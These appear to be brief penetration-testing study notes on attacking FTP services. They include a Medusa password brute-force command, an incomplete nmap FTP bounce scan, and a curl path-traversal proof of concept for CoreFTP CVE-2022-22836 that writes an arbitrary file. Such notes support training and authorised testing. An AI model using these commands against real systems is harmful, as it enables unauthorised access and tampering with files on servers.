
# Attacking Common Services
## Attack Concept

![](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/attack_concept2.png)

## FTP (21)

- Check if the server allows anonymous login
- Check version (ofc)
- Brute force with https://github.com/jmk-foofus/medusa

```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

### FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.

```
nmap -Pn -v -n -p80 -b 
```

### Latest Vuln
`CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability.

```
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

## SMB


## 